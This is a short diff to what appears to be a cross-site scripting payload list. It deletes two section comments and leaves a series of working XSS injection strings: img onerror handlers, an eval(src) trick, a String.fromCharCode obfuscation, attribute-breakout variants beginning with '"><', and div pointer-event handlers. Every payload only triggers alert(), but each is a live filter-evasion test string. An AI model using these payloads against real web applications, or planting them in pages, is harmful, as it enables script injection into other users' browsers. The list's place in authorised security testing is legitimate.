@@ -1,4 +1,3 @@
-// Img payload
 <img src=x onerror=alert('XSS');>
 <img src=x onerror=alert('XSS')//
 <img src=x onerror=alert(String.fromCharCode(88,83,83));>
@@ -6,9 +5,6 @@
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
-
-
-// Div payload
 <div onpointerover="alert(45)">MOVE HERE</div>
 <div onpointerdown="alert(45)">MOVE HERE</div>
 <div onpointerenter="alert(45)">MOVE HERE</div>
